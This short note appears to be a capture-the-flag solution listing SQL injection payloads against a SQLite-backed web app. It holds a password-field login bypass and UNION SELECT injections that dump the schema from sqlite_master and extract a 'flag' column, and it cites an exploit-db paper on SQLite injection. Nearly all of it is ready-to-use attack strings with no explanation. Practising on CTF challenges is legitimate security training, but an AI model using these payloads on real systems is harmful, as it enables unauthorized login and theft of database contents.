# password
admin' or '1'='1'--
# welcome
1' union select 1,2,3 --+
1' union select tbl_name,sql,3 from sqlite_master--+
1' union select 1,flag,3 from more_table--+
> reference: https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf